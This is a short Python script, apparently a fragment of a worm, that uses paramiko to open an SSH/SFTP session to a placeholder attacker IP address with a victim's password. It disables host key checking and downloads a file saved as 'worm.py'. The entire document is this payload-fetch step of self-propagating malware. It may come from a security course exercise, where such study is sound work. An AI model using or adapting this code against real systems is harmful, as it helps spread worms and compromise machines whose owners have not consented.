import paramiko

s = paramiko.SSHClient()
s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
s.connect(ATTACKER_IP_ADDRESS, 22, username="csc2021",
          password= VICTIM_PASSWORD , timeout=4)

sftp = s.open_sftp()
sftp.get( REMOTE_FILE_PATH , 'worm.py')

sftp.close()
